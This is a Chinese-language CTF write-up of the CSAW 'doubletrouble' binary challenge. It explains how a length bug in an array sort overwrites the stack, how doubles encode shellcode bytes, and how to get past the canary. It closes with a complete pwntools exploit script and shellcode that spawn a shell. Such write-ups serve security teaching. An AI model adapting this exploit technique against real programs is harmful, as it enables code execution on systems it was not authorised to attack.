---
title: doubletrouble
categories:
- csaw
---
# casaw->doubletrouble

## 前言
之前也遇到了一道类似的题，但是没有涉及到浮点数在内存中的存储，这道题更加综合，也给出来了绕过canary的一种思路，因此详细写一下writeup

## 程序逻辑
主函数是game，用户首先输入array的长度，大于64直接崩，但是会打印出system函数的地址，这个地址是不固定的。当小于等于64的时候，用户依次输入数组元素，之后打印数组成员，给出元素之和，最大元素和最小元素，找到出题人喜欢的元素，对数组排序等，挨个查看内部的逻辑，最终可以找到函数异常的部分

![function](./1.jpg)
![function2](./2.jpg)

## 漏洞点

在findArray()里，len表示数组长度，当arrary_len小于2倍原数组长度的时候，如果数组元素大于-100而小于-10，就返回这个元素的下标，如果遍历所有的元素均未发现满足此条件的元素，直接返回第一个元素。程序的问题在于每次遍历寻找的时候，都会增加数组的长度，这使得如果找到一个满足条件的元素，数组的长度都会发生变化。当然在这里，还没有显示破坏性。在下面的sortArray里，由于用到array_len判断程序的结束部分，之前增加的array_len会使得排序的部分超过了数组原有部分，且直接修改栈上的值。
比如我们输入100、-20、100，第一个元素不满足条件，数组长度变为4，随后的排序中，会将100后面的元素也一同排序，假设后面的值为90，那么就会被替换成100

![find_array](./3.jpg)
![sort_array](./4.jpg)

## 补充知识

这次栈上的元素都是8字节的double类型，我们想往栈上写数据就要了解数据的表示。在IEEE 754标准下，32位浮点数和64位浮点数的表示如下：（其中S是sign，E为exponet，M为fraction）

![data_form](./5.jpg)
![32_float](./5.png)
![64_double](./6.png)
![calc](./6.jpg)

### 例子
![example](./7.jpg)

## 漏洞利用

程序开始打印了数组在栈上的地址，我们可以控制返回地址到system函数的地址，后面接参数'/bin//sh'，也可以让程序返回到数组，执行数组里的shellcode，我们挨个尝试一下

因为最后要排序，我们得看下ebp和return addr的大小关系，根据IDA里可看到数组地址为ebp-0x210，64个元素之后就是64*8 = 0x200,因此要再多输入3个元素才能覆盖到返回地址，其中，ebp-0xc存的是canary，不能受排序影响，即第65个元素不变，第66个元素随意，第67个元素为system函数地址，第68个元素为'/bin/sh'，测试发现canary有时候正有时候负，变化很大，看来只能假设它是个比返回地址大的数，这样不会和被替换的返回地址交换。最后发现被替换的部分总是正数，大于-20，因此永远不可能让-20等负数到canary的下面，所以这个方法GG

尝试第二种方式，首先找到system在got表中的地址，之后发现程序中包含'/bin/csh'，结合以前做题的经验，我们知道system('sh')一样可以执行，sh相对于字符串的偏移为25，即0x19，所以'sh'的地址为0x0804A12D，shellcode为:
```asm
push 0x804A12D
call dword ptr [0x804BFF0]
```
![system_got](./8.jpg)
![binsh_addr](./9.jpg)

最终栈的结构如下:shellcode + padding + ret_addr 
![ret_addr](./10.jpg)

##exp.py
因为canary的值老变化，所以最终的exp还是要看脸，要想全自动化可以写个while True然后判断返回结果，这里我自己的exp也没跑通，上个官方的吧

```python
#!/usr/bin/env python

from pwn import *
from struct import *
import re, base64


__LIBC__ = ""
__NAME__ = "doubletrouble"
__REMOTE__ = "pwn.chal.csaw.io"
__REMOTE_PORT__ = 9002
__GDB__ = """
c
"""



context.arch = 'i386'

if __name__ == "__main__":


	log.info("pwning %s"  % __NAME__)


	if args.REMOTE:

		log.info("remote run")
		r = remote(__REMOTE__, __REMOTE_PORT__)

	else:

		log.info("local run")

		if args.GDB:

			if args.GDB == 'attach':

				r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})
				log.info("attaching gdb...")
				gdb.attach(r.pid, __GDB__)	

			else:

				r = gdb.debug("./%s" % __NAME__, __GDB__)
		else:

			r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})

	r.recvuntil("0x")
	stack = r.recv(8)

	stack = int(stack, 16)
	log.info("stack 0x%x", stack)

	r.sendlineafter("long: ", str(64))

	pad = "%.20g" % unpack("<d", p64(0xf8ffffffffffffff))[0]
	jmp  = 0x080498A4ffffffff # ret gadget
	jmp2 = 0x0806000000000000 + stack # addr of shellcode


	sh1 = asm("push 0x804A12D; jmp $+3").ljust(8, '\xfe')
	sh2 = asm("call dword ptr [0x804BFF0]").ljust(8, '\xfc')

	r.sendline("%.20g" % struct.unpack("<d", sh1)[0])
	r.sendline("%.20g" % struct.unpack("<d", sh2)[0])

	for i in range(0, 2):
		r.sendline(pad)

	r.sendline(str(-99))
	r.sendline( "%.20g" % struct.unpack("<d", p64(jmp))[0])
	r.sendline( "%.20g" % struct.unpack("<d", p64(jmp2))[0])

	for i in range(0, 64-7):
	 	r.sendline( pad)

	r.sendline("ls")
	r.interactive()

```
